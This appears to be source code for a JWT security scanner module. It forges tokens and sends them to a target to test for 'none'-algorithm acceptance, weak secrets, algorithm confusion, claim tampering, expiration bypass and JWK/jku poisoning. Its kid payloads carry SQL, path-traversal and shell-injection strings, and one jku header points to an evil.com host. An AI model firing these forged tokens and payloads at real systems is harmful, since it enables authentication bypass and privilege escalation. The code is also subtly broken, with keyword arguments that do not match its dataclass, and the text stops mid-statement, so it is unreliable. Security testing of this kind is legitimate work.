"""
JWT Security Scanner - PHANTOM AI Enterprise Edition v3.0

Comprehensive JSON Web Token security testing module for detecting
JWT-related vulnerabilities and misconfigurations.

Features:
- Algorithm confusion attacks (None, HS256/RS256 switching)
- Weak secret detection and brute-forcing
- Key confusion attacks (JWK injection, jku/x5u manipulation)
- Token manipulation (expiration bypass, claim tampering)
- Signature validation bypass techniques
- Kid parameter injection
- Token replay and reuse detection
- JWT best practices validation

CWE Coverage:
- CWE-287: Improper Authentication
- CWE-294: Authentication Bypass by Capture-replay
- CWE-327: Use of a Broken or Risky Cryptographic Algorithm
- CWE-347: Improper Verification of Cryptographic Signature
- CWE-798: Use of Hard-coded Credentials
- CWE-916: Use of Password Hash With Insufficient Computational Effort

Based on:
- JWT Security Best Practices (RFC 8725)
- OWASP JWT Cheat Sheet
- PortSwigger JWT Attacks
- Real-world CVE patterns

Author: PHANTOM AI Team
Version: 3.0.0
"""

from __future__ import annotations

import re
import json
import base64
import hmac
import hashlib
import asyncio
import time
from dataclasses import dataclass
from typing import TYPE_CHECKING, Any, Optional, List, Dict
from urllib.parse import urljoin
from enum import Enum

import httpx

from scanning.findings import Finding, Severity, VulnType
from scanning.vuln_scanner import ScanModule
from utils.scan_client import get_scan_client
from utils.logger import get_logger
from utils.rate_limiter import RateLimiter

if TYPE_CHECKING:
    from core.config_manager import Settings

logger = get_logger(__name__)


# =============================================================================
# ENUMS AND CONSTANTS
# =============================================================================

class JWTAttackType(Enum):
    """Types of JWT attacks."""
    ALGORITHM_NONE = "algorithm_none"
    ALGORITHM_CONFUSION = "algorithm_confusion"
    WEAK_SECRET = "weak_secret"
    KEY_INJECTION = "key_injection"
    JKU_INJECTION = "jku_injection"
    X5U_INJECTION = "x5u_injection"
    KID_INJECTION = "kid_injection"
    EXPIRATION_BYPASS = "expiration_bypass"
    CLAIM_TAMPERING = "claim_tampering"
    SIGNATURE_BYPASS = "signature_bypass"
    TOKEN_REPLAY = "token_replay"
    EMBEDDED_JWK = "embedded_jwk"
    NBF_BYPASS = "nbf_bypass"
    AUDIENCE_CONFUSION = "audience_confusion"
    ISSUER_SPOOFING = "issuer_spoofing"
    LONG_LIVED_TOKEN = "long_lived_token"
    SIGNATURE_STRIPPING = "signature_stripping"


class JWTAlgorithm(Enum):
    """JWT signing algorithms."""
    NONE = "none"
    HS256 = "HS256"
    HS384 = "HS384"
    HS512 = "HS512"
    RS256 = "RS256"
    RS384 = "RS384"
    RS512 = "RS512"
    ES256 = "ES256"
    ES384 = "ES384"
    ES512 = "ES512"
    PS256 = "PS256"
    PS384 = "PS384"
    PS512 = "PS512"


# Common weak secrets for brute-forcing
WEAK_SECRETS = [
    "secret", "Secret", "SECRET",
    "password", "Password", "PASSWORD",
    "123456", "12345678", "1234567890",
    "jwt_secret", "jwt-secret", "jwtsecret",
    "token_secret", "token-secret", "tokensecret",
    "api_secret", "api-secret", "apisecret",
    "key", "Key", "KEY",
    "private", "Private", "PRIVATE",
    "mykey", "MyKey", "MYKEY",
    "mysecret", "MySecret", "MYSECRET",
    "secretkey", "SecretKey", "SECRETKEY",
    "secret123", "Secret123",
    "changeme", "ChangeMe", "CHANGEME",
    "admin", "Admin", "ADMIN",
    "administrator", "Administrator",
    "qwerty", "QWERTY",
    "welcome", "Welcome",
    "letmein", "LetMeIn",
    "passw0rd", "Passw0rd",
    "default", "Default",
    "test", "Test", "TEST",
    "dev", "Dev", "DEV",
    "development", "Development",
    "production", "Production",
    "staging", "Staging",
    "your-256-bit-secret",
    "your-512-bit-secret",
    "super-secret-key",
    "",  # Empty secret
]


# =============================================================================
# DATA CLASSES
# =============================================================================

@dataclass
class JWTToken:
    """Parsed JWT token."""
    raw: str
    header: Dict[str, Any]
    payload: Dict[str, Any]
    signature: bytes
    is_valid: bool = True
    location: str = ""  # Where the token was found

    @classmethod
    def parse(cls, token: str, location: str = "") -> Optional["JWTToken"]:
        """Parse a JWT token string."""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return None

            # Decode header
            header_b64 = parts[0] + "=" * (-len(parts[0]) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_b64))

            # Decode payload
            payload_b64 = parts[1] + "=" * (-len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_b64))

            # Decode signature
            sig_b64 = parts[2] + "=" * (-len(parts[2]) % 4)
            signature = base64.urlsafe_b64decode(sig_b64)

            return cls(
                raw=token,
                header=header,
                payload=payload,
                signature=signature,
                location=location,
            )
        except Exception:
            return None

    def get_algorithm(self) -> str:
        """Get the token's algorithm."""
        return self.header.get("alg", "unknown")

    def get_claims(self) -> Dict[str, Any]:
        """Get token claims."""
        return self.payload

    def is_expired(self) -> bool:
        """Check if token is expired."""
        exp = self.payload.get("exp")
        if exp:
            return time.time() > exp
        return False

    def has_claim(self, claim: str) -> bool:
        """Check if token has a specific claim."""
        return claim in self.payload


@dataclass
class JWTVulnerability:
    """JWT vulnerability finding."""
    attack_type: JWTAttackType
    severity: str
    description: str
    token_location: str
    original_token: str
    manipulated_token: Optional[str] = None
    evidence: str = ""
    remediation: str = ""
    cwe: str = ""
    cvss_score: float = 0.0


# =============================================================================
# JWT MANIPULATION UTILITIES
# =============================================================================

class JWTManipulator:
    """Utility class for JWT manipulation."""

    @staticmethod
    def b64url_encode(data: bytes) -> str:
        """Base64URL encode without padding."""
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    @staticmethod
    def b64url_decode(data: str) -> bytes:
        """Base64URL decode with padding handling."""
        data += "=" * (-len(data) % 4)
        return base64.urlsafe_b64decode(data)

    @staticmethod
    def create_token(
        header: Dict[str, Any],
        payload: Dict[str, Any],
        secret: str = "",
        algorithm: str = "HS256",
    ) -> str:
        """Create a JWT token."""
        header_b64 = JWTManipulator.b64url_encode(json.dumps(header).encode())
        payload_b64 = JWTManipulator.b64url_encode(json.dumps(payload).encode())

        message = f"{header_b64}.{payload_b64}"

        if algorithm.lower() == "none":
            signature = ""
        elif algorithm.startswith("HS"):
            # HMAC-based
            if algorithm == "HS256":
                sig = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
            elif algorithm == "HS384":
                sig = hmac.new(secret.encode(), message.encode(), hashlib.sha384).digest()
            elif algorithm == "HS512":
                sig = hmac.new(secret.encode(), message.encode(), hashlib.sha512).digest()
            else:
                sig = b""
            signature = JWTManipulator.b64url_encode(sig)
        else:
            # For RS/ES algorithms, we'd need the private key
            # Just return empty signature for testing purposes
            signature = ""

        return f"{message}.{signature}"

    @staticmethod
    def create_none_algorithm_token(original: JWTToken) -> str:
        """Create a token with 'none' algorithm."""
        header = original.header.copy()
        header["alg"] = "none"
        return JWTManipulator.create_token(header, original.payload, algorithm="none")

    @staticmethod
    def create_algorithm_confusion_token(
        original: JWTToken,
        public_key: str = "",
    ) -> str:
        """Create a token with algorithm confusion (RS256 -> HS256)."""
        header = original.header.copy()
        header["alg"] = "HS256"
        # Use public key as HMAC secret
        return JWTManipulator.create_token(
            header, original.payload, secret=public_key, algorithm="HS256"
        )

    @staticmethod
    def create_expired_bypass_token(original: JWTToken) -> str:
        """Create a token with modified/removed expiration."""
        header = original.header.copy()
        payload = original.payload.copy()

        # Option 1: Remove exp claim
        if "exp" in payload:
            del payload["exp"]

        # Option 2: Set exp far in future
        payload["exp"] = int(time.time()) + (365 * 24 * 60 * 60)  # 1 year

        return JWTManipulator.create_token(header, payload, algorithm="none")

    @staticmethod
    def create_kid_injection_tokens(original: JWTToken) -> List[str]:
        """Create tokens with kid parameter injection."""
        tokens = []
        header = original.header.copy()

        # SQL injection in kid
        injection_kids = [
            "' OR '1'='1",
            "1' AND '1'='1",
            "'; SELECT * FROM secrets--",
            "../../etc/passwd",
            "/dev/null",
            "key|ls",
            "key`id`",
            "key$(whoami)",
        ]

        for kid in injection_kids:
            header["kid"] = kid
            token = JWTManipulator.create_token(header, original.payload, algorithm="none")
            tokens.append(token)

        return tokens

    @staticmethod
    def create_jku_injection_token(original: JWTToken, malicious_url: str) -> str:
        """Create token with jku pointing to attacker-controlled URL."""
        header = original.header.copy()
        header["jku"] = malicious_url
        return JWTManipulator.create_token(header, original.payload, algorithm="none")

    @staticmethod
    def create_claim_tampered_token(
        original: JWTToken,
        claim: str,
        value: Any,
    ) -> str:
        """Create token with modified claim."""
        header = original.header.copy()
        payload = original.payload.copy()
        payload[claim] = value
        return JWTManipulator.create_token(header, payload, algorithm="none")

    @staticmethod
    def forge_with_secret(token: JWTToken, secret: str, algorithm: str) -> str:
        """
        Forge a JWT token with a given secret and algorithm.

        P0 FIX 2026-02-11: Method was called but never implemented.
        Used in algorithm confusion testing to sign tokens with weak secrets.

        Args:
            token: Original JWT token to forge
            secret: Secret key to sign with
            algorithm: Target algorithm (HS256, HS384, HS512)

        Returns:
            Forged token string, or empty string on failure
        """
        try:
            # Create new header with target algorithm
            header = token.header.copy()
            header["alg"] = algorithm

            # Keep original payload
            payload = token.payload.copy()

            # Create token with the provided secret
            return JWTManipulator.create_token(header, payload, secret=secret, algorithm=algorithm)
        except Exception:
            return ""

    @staticmethod
    def verify_hmac_signature(token: JWTToken, secret: str) -> bool:
        """Verify HMAC signature with a secret."""
        parts = token.raw.split(".")
        if len(parts) != 3:
            return False

        message = f"{parts[0]}.{parts[1]}"
        alg = token.get_algorithm().upper()

        try:
            if alg == "HS256":
                expected = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
            elif alg == "HS384":
                expected = hmac.new(secret.encode(), message.encode(), hashlib.sha384).digest()
            elif alg == "HS512":
                expected = hmac.new(secret.encode(), message.encode(), hashlib.sha512).digest()
            else:
                return False

            return hmac.compare_digest(token.signature, expected)
        except Exception:
            return False


# =============================================================================
# JWT SECURITY SCANNER
# =============================================================================

class JWTScanner(ScanModule):
    """
    PHANTOM AI JWT Security Scanner.

    Comprehensive testing for JWT-related vulnerabilities including
    algorithm confusion, weak secrets, and various injection attacks.
    """

    MODULE_NAME = "jwt"
    MODULE_DESCRIPTION = "JWT Security Scanner - Algorithm confusion, weak secrets, injection attacks"
    MODULE_VERSION = "3.0.0"
    MODULE_AUTHOR = "PHANTOM AI Team"

    def __init__(
        self,
        settings: Optional["Settings"] = None,
        *,
        findings_store: Any = None,
        rate_limiter: Any = None,
    ) -> None:
        """Initialize the JWT scanner."""
        super().__init__(settings, findings_store=findings_store, rate_limiter=rate_limiter)
        self.rate_limiter = rate_limiter or RateLimiter(default_rate=10.0)
        self.client: Optional[httpx.AsyncClient] = None
        self.findings: List[Finding] = []
        self.discovered_tokens: List[JWTToken] = []
        self.manipulator = JWTManipulator()

    async def scan(
        self,
        target: str,
        endpoints: Optional[List[str]] = None,
        existing_tokens: Optional[List[str]] = None,
        **kwargs,
    ) -> List[Finding]:
        """
        Execute JWT security scan.

        Args:
            target: Target URL
            endpoints: List of endpoints to test
            existing_tokens: Known JWT tokens to test
            **kwargs: Additional parameters (asset_data with endpoint_params/vuln_type_hints)

        Returns:
            List of findings
        """
        self.findings = []
        self.discovered_tokens = []

        # ENHANCEMENT 2026-02-20: Get metadata-discovered endpoints with JWT hints
        asset_data = kwargs.get("asset_data", {})
        if not isinstance(asset_data, dict):
            asset_data = {}

        vuln_type_hints = asset_data.get("vuln_type_hints", {})
        endpoint_params = asset_data.get("endpoint_params", {})

        # JWT vulnerability type patterns
        jwt_hint_types = {
            "JWT", "JWT_NONE_ALGORITHM", "JWT_NULL_SIGNATURE", "JWT_WEAK_SECRET",
            "JWT_KID_INJECTION", "JWT_JKU_INJECTION", "JWT_X5U_INJECTION",
            "JWT_ALGORITHM_CONFUSION", "JWT_EMBEDDED_JWK", "JWT_CLAIM_TAMPERING"
        }

        # Find endpoints with JWT hints
        jwt_endpoints = []
        for ep_url, hints in vuln_type_hints.items():
            if any(h in jwt_hint_types for h in hints):
                jwt_endpoints.append(ep_url)

        if jwt_endpoints:
            logger.info(f"[JWT Scanner] Found {len(jwt_endpoints)} metadata-discovered JWT endpoints")
            # Add to endpoints list for token discovery
            if endpoints is None:
                endpoints = []
            endpoints = list(endpoints) + jwt_endpoints

        logger.info(f"[JWT Scanner] Starting scan of {target}")

        async with get_scan_client(
            timeout=30.0,
            follow_redirects=True,
            verify_ssl=False,
        ) as self.client:

            # Phase 1: Token Discovery
            if not existing_tokens:
                await self._discover_tokens(target, endpoints or [])
            else:
                for token_str in existing_tokens:
                    token = JWTToken.parse(token_str, "provided")
                    if token:
                        self.discovered_tokens.append(token)

            logger.info(f"[JWT Scanner] Found {len(self.discovered_tokens)} JWT tokens")

            # FN-C2 FIX: Increased token limit (was 3, now 8)
            max_tokens = 8
            tokens_to_test = self.discovered_tokens[:max_tokens]
            if len(self.discovered_tokens) > max_tokens:
                logger.info(f"[JWT Scanner] Limiting to {max_tokens} tokens (found {len(self.discovered_tokens)})")

            # Phase 2: Token Analysis
            for token in tokens_to_test:
                await self._analyze_token(target, token)

            # Phase 3: Attack Tests (with early termination for critical findings)
            for token in tokens_to_test:
                # Core attacks (always run)
                await self._test_none_algorithm(target, token)
                await self._test_weak_secrets(target, token)
                await self._test_signature_stripping(target, token)

                # FN-FIX 2026-02-08: Removed early exit after 2 CRITICAL findings
                # JWK poisoning ($5k-$20k bounties) and other HIGH VALUE tests
                # were being skipped, causing significant false negatives

                await self._test_algorithm_confusion(target, token)
                await self._test_kid_injection(target, token)
                await self._test_claim_tampering(target, token)
                await self._test_expiration_bypass(target, token)
                # HIGH VALUE: JWK Poisoning Attacks ($5k-$20k bounties)
                await self._test_jwk_poisoning(target, token)
                # Edge case tests
                await self._test_nbf_bypass(target, token)
                await self._test_audience_confusion(target, token)
                # Token hygiene check
                self._check_token_lifetime(target, token)

        logger.info(f"[JWT Scanner] Scan complete. Found {len(self.findings)} vulnerabilities")

        return self.findings

    async def _discover_tokens(
        self,
        target: str,
        endpoints: List[str],
    ) -> None:
        """Discover JWT tokens in responses."""
        # JWT regex pattern
        jwt_pattern = re.compile(
            r'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*'
        )

        test_endpoints = endpoints or ["/", "/api", "/api/v1", "/auth", "/login"]

        # Phase 1a: Try to get token via login endpoints
        await self._discover_tokens_via_login(target, jwt_pattern)

        # OPTIMIZATION: Limit discovery to prevent timeout
        max_discovery_tests = 20
        discovery_count = 0

        for endpoint in test_endpoints:
            if discovery_count >= max_discovery_tests:
                logger.debug(f"[JWT Scanner] Reached discovery limit ({max_discovery_tests})")
                break

            url = urljoin(target, endpoint)
            discovery_count += 1

            try:
                await self.rate_limiter.acquire()
                response = await self.client.get(url, timeout=10.0)

                # Check response body
                for match in jwt_pattern.finditer(response.text):
                    token = JWTToken.parse(match.group(), f"body:{endpoint}")
                    if token:
                        self.discovered_tokens.append(token)

                # Check response headers
                for header, value in response.headers.items():
                    for match in jwt_pattern.finditer(value):
                        token = JWTToken.parse(match.group(), f"header:{header}")
                        if token:
                            self.discovered_tokens.append(token)

                # Check cookies
                for cookie in response.cookies:
                    for match in jwt_pattern.finditer(response.cookies[cookie]):
                        token = JWTToken.parse(match.group(), f"cookie:{cookie}")
                        if token:
                            self.discovered_tokens.append(token)

            except Exception as e:
                logger.debug(f"[JWT Scanner] Error scanning {endpoint}: {e}")

    async def _discover_tokens_via_login(
        self,
        target: str,
        jwt_pattern: re.Pattern,
    ) -> None:
        """Try to get JWT tokens via login endpoints."""
        # Common login endpoints and payloads (generic - no target-specific creds)
        login_attempts = [
            ("/rest/user/login", {"email": "test@test.com", "password": "test123"}),
            ("/api/login", {"username": "test", "password": "test123"}),
            ("/api/auth/login", {"email": "test@test.com", "password": "test123"}),
            ("/login", {"email": "test@test.com", "password": "test123"}),
            ("/auth/login", {"username": "test", "password": "test123"}),
            ("/api/v1/auth/login", {"email": "test@test.com", "password": "test123"}),
            ("/api/v1/login", {"email": "test@test.com", "password": "test123"}),
        ]

        for endpoint, payload in login_attempts:
            url = urljoin(target, endpoint)
            try:
                await self.rate_limiter.acquire()
                response = await self.client.post(
                    url,
                    json=payload,
                    headers={"Content-Type": "application/json"},
                    timeout=10.0,
                )

                # Look for JWT in response body
                for match in jwt_pattern.finditer(response.text):
                    token = JWTToken.parse(match.group(), f"login:{endpoint}")
                    if token:
                        self.discovered_tokens.append(token)
                        logger.info(f"[JWT Scanner] Found token via login: {endpoint}")

                # Check Set-Cookie headers
                for header, value in response.headers.items():
                    if header.lower() == "set-cookie":
                        for match in jwt_pattern.finditer(value):
                            token = JWTToken.parse(match.group(), f"cookie:{endpoint}")
                            if token:
                                self.discovered_tokens.append(token)

            except Exception as e:
                logger.debug(f"[JWT Scanner] Login attempt failed for {endpoint}: {e}")

    async def _analyze_token(self, target: str, token: JWTToken) -> None:
        """Analyze token for security issues."""
        alg = token.get_algorithm()

        # Check for 'none' algorithm
        if alg.lower() == "none":
            self._add_finding(
                title="JWT None Algorithm Used",
                severity=Severity.CRITICAL,
                vulnerability=JWTVulnerability(
                    attack_type=JWTAttackType.ALGORITHM_NONE,
                    severity=Severity.CRITICAL,
                    description="Token uses 'none' algorithm which disables signature verification",
                    token_location=token.location,
                    original_token=token.raw,
                    remediation="Always require a cryptographic algorithm (HS256, RS256, etc.)",
                    cwe_id="CWE-327",
                    cvss_score=9.8,
                ),
                target=target,
            )

        # Check for weak algorithms
        if alg in ["HS256", "HS384", "HS512"]:
            self._add_finding(
                title="JWT Uses Symmetric Algorithm",
                severity=Severity.INFO,
                vulnerability=JWTVulnerability(
                    attack_type=JWTAttackType.WEAK_SECRET,
                    severity=Severity.INFO,
                    description=f"Token uses symmetric algorithm ({alg}) which may be vulnerable to brute-force",
                    token_location=token.location,
                    original_token=token.raw,
                    remediation="Consider using asymmetric algorithms (RS256, ES256) for better security",
                    cwe_id="CWE-327",
                    cvss_score=3.0,
                ),
                target=target,
            )

        # Check for missing claims
        required_claims = ["exp", "iat", "iss", "aud"]
        missing_claims = [c for c in required_claims if not token.has_claim(c)]

        if missing_claims:
            self._add_finding(
                title="JWT Missing Security Claims",
                severity=Severity.MEDIUM,
                vulnerability=JWTVulnerability(
                    attack_type=JWTAttackType.CLAIM_TAMPERING,
                    severity=Severity.MEDIUM,
                    description=f"Token is missing security claims: {', '.join(missing_claims)}",
                    token_location=token.location,
                    original_token=token.raw,
                    remediation="Include exp, iat, iss, and aud claims in all tokens",
                    cwe_id="CWE-287",
                    cvss_score=5.0,
                ),
                target=target,
            )

        # Check for expired token
        if token.is_expired():
            self._add_finding(
                title="Expired JWT Token Accepted",
                severity=Severity.MEDIUM,
                vulnerability=JWTVulnerability(
                    attack_type=JWTAttackType.EXPIRATION_BYPASS,
                    severity=Severity.MEDIUM,
                    description="Server accepts expired JWT tokens",
                    token_location=token.location,
                    original_token=token.raw,
                    remediation="Validate token expiration on every request",
                    cwe_id="CWE-294",
                    cvss_score=5.5,
                ),
                target=target,
            )

        # Check for sensitive data in payload
        sensitive_keys = ["password", "secret", "key", "credit_card", "ssn", "api_key"]
        for key in token.payload:
            if any(s in key.lower() for s in sensitive_keys):
                self._add_finding(
                    title="Sensitive Data in JWT Payload",
                    severity=Severity.HIGH,
                    vulnerability=JWTVulnerability(
                        attack_type=JWTAttackType.CLAIM_TAMPERING,
                        severity=Severity.HIGH,
                        description=f"Token contains potentially sensitive data in claim: {key}",
                        token_location=token.location,
                        original_token=token.raw,
                        remediation="Never store sensitive data in JWT payloads as they are only base64 encoded",
                        cwe_id="CWE-200",
                        cvss_score=6.5,
                    ),
                    target=target,
                )

    async def _test_none_algorithm(self, target: str, token: JWTToken) -> None:
        """Test for none algorithm vulnerability."""
        if token.get_algorithm().lower() == "none":
            return  # Already using none

        # Create token with none algorithm
        none_token = self.manipulator.create_none_algorithm_token(token)

        # Test with various none variations
        none_variants = [
            none_token,
            none_token.replace('"none"', '"None"'),
            none_token.replace('"none"', '"NONE"'),
            none_token.replace('"none"', '"nOnE"'),
        ]

        for variant in none_variants:
            if await self._test_token_accepted(target, variant, token):
                self._add_finding(
                    title="JWT None Algorithm Attack Successful",
                    severity=Severity.CRITICAL,
                    vulnerability=JWTVulnerability(
                        attack_type=JWTAttackType.ALGORITHM_NONE,
                        severity=Severity.CRITICAL,
                        description="Server accepts tokens with 'none' algorithm, bypassing signature verification",
                        token_location=token.location,
                        original_token=token.raw,
                        manipulated_token=variant,
                        evidence="Token with 'none' algorithm was accepted",
                        remediation="Explicitly whitelist allowed algorithms and reject 'none'",
                        cwe_id="CWE-347",
                        cvss_score=9.8,
                    ),
                    target=target,
                )
                break

    async def _test_algorithm_confusion(self, target: str, token: JWTToken) -> None:
        """Test for algorithm confusion attacks.

        JUICE-SHOP-FIX 2026-02-11: Now tests BOTH directions:
        - RS256 → HS256 (classic attack, needs public key)
        - HS256 → try common secrets (Juice Shop vulnerability)
        - Any alg → test with placeholder secrets
        """
        alg = token.get_algorithm()

        # Test RS → HS confusion (classic attack)
        if alg.startswith("RS"):
            self._add_finding(
                title="Potential Algorithm Confusion Vulnerability",
                severity=Severity.MEDIUM,
                vulnerability=JWTVulnerability(
                    attack_type=JWTAttackType.ALGORITHM_CONFUSION,
                    severity=Severity.MEDIUM,
                    description=f"Token uses {alg}. Test manually for RS256->HS256 confusion attack",
                    token_location=token.location,
                    original_token=token.raw,
                    remediation="Validate algorithm server-side and don't trust alg header",
                    cwe_id="CWE-327",
                    cvss_score=7.5,
                ),
                target=target,
            )

        # JUICE-SHOP-FIX: For HS algorithms, try algorithm downgrade attacks
        # Even if not RS, the server might accept other algorithms
        if alg.startswith("HS"):
            # Try changing to weaker algorithms
            downgrade_attacks = [
                ("HS384", "HS256"),  # Downgrade hash strength
                ("HS512", "HS256"),
                (alg, "none"),  # Already tested in _test_none_algorithm but double-check
            ]

            for orig_alg, target_alg in downgrade_attacks:
                if alg == orig_alg or target_alg == "none":
                    # Try to forge with common placeholder secrets
                    placeholder_secrets = [
                        "", "secret", "key", "jwt", "token", "auth",
                        "password", "test", "development", "dev", "debug"
                    ]
                    for secret in placeholder_secrets[:5]:  # Budget limit
                        try:
                            forged = self.manipulator.forge_with_secret(token, secret, target_alg if target_alg != "none" else alg)
                            if forged and await self._test_forged_token(target, forged, token.location):
                                self._add_finding(
                                    title=f"Algorithm Confusion - {alg} accepts weak secret",
                                    severity=Severity.CRITICAL,
                                    vulnerability=JWTVulnerability(
                                        attack_type=JWTAttackType.ALGORITHM_CONFUSION,
                                        severity=Severity.CRITICAL,
                                        description=f"Token with {alg} can be forged using secret: '{secret or '(empty)'}'",
                                        token_location=token.location,
                                        original_token=token.raw,
                                        forged_token=forged,
                                        remediation="Use strong, randomly-generated secrets for JWT signing",
                                        cwe_id="CWE-327",
                                        cvss_score=9.8,
                                    ),
                                    target=target,
                                )
                                return  # Found critical issue, stop testing
                        except Exception as e:
                            logger.debug(f"[JWT] Algorithm confusion test failed: {e}")

    async def _test_weak_secrets(self, target: str, token: JWTToken) -> None:
        """Test for weak HMAC secrets."""
        alg = token.get_algorithm()

        if not alg.startswith("HS"):
            return

        logger.debug(f"[JWT Scanner] Testing {len(WEAK_SECRETS)} common secrets")

        for secret in WEAK_SECRETS:
            if self.manipulator.verify_hmac_signature(token, secret):
                self._add_finding(
                    title="JWT Weak Secret Detected",
                    severity=Severity.CRITICAL,
                    vulnerability=JWTVulnerability(
                        attack_type=JWTAttackType.WEAK_SECRET,
                        severity=Severity.CRITICAL,
                        description=f"JWT secret is weak and guessable: '{secret}' or similar",
                        token_location=token.location,
                        original_token=token.raw,
                        evidence=f"Secret '{secret}' produces valid signature",
                        remediation="Use a cryptographically random secret of at least 256 bits",
                        cwe_id="CWE-798",
                        cvss_score=9.1,
                    ),
                    target=target,
                )
                return  # Found weak secret, no need to continue

    async def _test_kid_injection(self, target: str, token: JWTToken) -> None:
        """Test for kid parameter injection."""
        if "kid" not in token.header:
            return

        injection_tokens = self.manipulator.create_kid_injection_tokens(token)

        # FN-C2 FIX: Test more kid injection variants (was [:3])
        for inj_token in injection_tokens[:8]:
            if await self._test_token_accepted(target, inj_token, token):
                self._add_finding(
                    title="JWT Kid Parameter Injection",
                    severity=Severity.HIGH,
                    vulnerability=JWTVulnerability(
                        attack_type=JWTAttackType.KID_INJECTION,
                        severity=Severity.HIGH,
                        description="Server is vulnerable to kid parameter injection attacks",
                        token_location=token.location,
                        original_token=token.raw,
                        manipulated_token=inj_token,
                        evidence="Injected kid value was processed",
                        remediation="Validate and sanitize kid parameter, use allowlist",
                        cwe_id="CWE-89",
                        cvss_score=8.0,
                    ),
                    target=target,
                )
                break

    async def _test_claim_tampering(self, target: str, token: JWTToken) -> None:
        """Test for claim tampering vulnerabilities."""
        # FN-FIX 2026-02-08: Extended role/permission claim names
        # Many apps use non-standard claim names that were being missed
        tamper_tests = [
            # Standard role claims
            ("role", "admin"),
            ("role", "administrator"),
            ("roles", ["admin"]),
            ("roles", ["administrator", "superuser"]),
            # Boolean admin flags
            ("is_admin", True),
            ("isAdmin", True),
            ("admin", True),
            ("is_superuser", True),
            ("isSuperuser", True),
            # Alternative naming conventions
            ("group", "admin"),
            ("groups", ["admin", "administrators"]),
            ("authority", "ROLE_ADMIN"),
            ("authorities", ["ROLE_ADMIN"]),
            ("type", "admin"),
            ("user_type", "admin"),
            ("userType", "admin"),
            ("level", "admin"),
            ("access_level", "admin"),
            ("accessLevel", 999),
            # Permission arrays/scopes
            ("permissions", ["admin", "write", "delete"]),
            ("perms", ["admin", "*"]),
            ("scope", "admin read write"),
            ("scopes", ["admin", "superuser"]),
            # Privilege escalation via user ID
            ("user_id", 1),
            ("userId", 1),
            ("uid", 0),  # Unix root
            ("sub", "admin"),
        ]

        for claim, value in tamper_tests:
            tampered_token = self.manipulator.create_claim_tampered_token(
                token, claim, value
            )

            if await self._test_token_accepted(target, tampered_token, token):
                self._add_finding(
                    title="JWT Claim Tampering Successful",
                    severity=Severity.CRITICAL,
                    vulnerability=JWTVulnerability(
                        attack_type=JWTAttackType.CLAIM_TAMPERING,
                        severity=Severity.CRITICAL,
                        description=f"Server accepts tokens with tampered {claim} claim",
                        token_location=token.location,
                        original_token=token.raw,
                        manipulated_token=tampered_token,
                        evidence=f"Token with {claim}={value} was accepted",
                        remediation="Validate token signature and claims on every request",
                        cwe_id="CWE-287",
                        cvss_score=9.0,
                    ),
                    target=target,
                )

    async def _test_expiration_bypass(self, target: str, token: JWTToken) -> None:
        """Test for expiration bypass."""
        bypass_token = self.manipulator.create_expired_bypass_token(token)

        if await self._test_token_accepted(target, bypass_token, token):
            self._add_finding(
                title="JWT Expiration Bypass",
                severity=Severity.HIGH,
                vulnerability=JWTVulnerability(
                    attack_type=JWTAttackType.EXPIRATION_BYPASS,
                    severity=Severity.HIGH,
                    description="Server accepts tokens with removed or extended expiration",
                    token_location=token.location,
                    original_token=token.raw,
                    manipulated_token=bypass_token,
                    evidence="Token with modified expiration was accepted",
                    remediation="Always validate exp claim and reject expired tokens",
                    cwe_id="CWE-294",
                    cvss_score=7.5,
                ),
                target=target,
            )

    async def _test_jwk_poisoning(self, target: str, token: JWTToken) -> None:
        """
        Test for JWK poisoning attacks (HIGH VALUE - $5k-$20k bounties).

        This tests three critical JWK attack vectors:
        1. Embedded JWK Attack - Inject our public key in 'jwk' header
        2. JKU Injection - Redirect 'jku' URL to attacker-controlled server
        3. X5U Injection - Redirect 'x5u' URL to attacker certificate

        These attacks allow complete authentication bypass if vulnerable.
        """
        import secrets

        alg = token.get_algorithm()

        # Only applicable to RS/ES algorithms (asymmetric)
        if not any(alg.startswith(prefix) for prefix in ["RS", "ES", "PS"]):
            return

        logger.debug(f"[JWT Scanner] Testing JWK poisoning attacks on {alg} token")

        # ==================================================================
        # ATTACK 1: Embedded JWK Attack
        # Inject attacker's public key directly in the JWT header
        # ==================================================================
        try:
            embedded_token = self._create_embedded_jwk_token(token)
            if embedded_token and await self._test_token_accepted(target, embedded_token, token):
                self._add_finding(
                    title="JWT Embedded JWK Attack - Authentication Bypass",
                    severity=Severity.CRITICAL,
                    vulnerability=JWTVulnerability(
                        attack_type=JWTAttackType.EMBEDDED_JWK,
                        severity=Severity.CRITICAL,
                        description="Server accepts tokens with embedded JWK public key in header. "
                                   "Attacker can forge any JWT by including their own signing key. "
                                   "This is a CRITICAL vulnerability allowing complete authentication bypass.",
                        token_location=token.location,
                        original_token=token.raw,
                        manipulated_token=embedded_token,
                        evidence="Token with attacker's embedded JWK was accepted",
                        remediation="Never trust 'jwk' header in JWT. "
                                   "Always use pre-configured keys from a trusted key store. "
                                   "Remove jwk header processing from JWT validation.",
                        cwe_id="CWE-347",  # Improper Verification of Cryptographic Signature
                        cvss_score=9.8,
                    ),
                    target=target,
                )
                logger.warning(f"[JWT Scanner] CRITICAL: Embedded JWK attack successful!")
        except Exception as e:
            logger.debug(f"[JWT Scanner] Embedded JWK test error: {e}")

        # ==================================================================
        # ATTACK 2: JKU (JWK Set URL) Injection
        # Redirect jku to attacker-controlled URL serving our public key
        # ==================================================================
        try:
            # Test with common attacker-controlled URL patterns
            jku_test_urls = [
                f"https://evil.com/{secrets.token_hex(8)}/jwks.json",
                "https://localhost/.well-known/jwks.json",
                "http://127.0.0.1/jwks.json",
                # URL parameter pollution
                f"{target}/.well-known/jwks.json?callback=evil",
                # Same domain confusion
                f"{target}/../../../evil/jwks.json",
            ]

            for jku_url in jku_test_urls[:2]:  # Limit to avoid noise
                jku_token = self._create_jku_injection_token(token, jku_url)
                if jku_token and await self._test_token_accepted(target, jku_token, token):
                    self._add_finding(
                        title="JWT JKU Injection - Key URL Redirect",
                        severity=Severity.CRITICAL,
                        vulnerability=JWTVulnerability(
                            attack_type=JWTAttackType.JKU_INJECTION,
                            severity=Severity.CRITICAL,
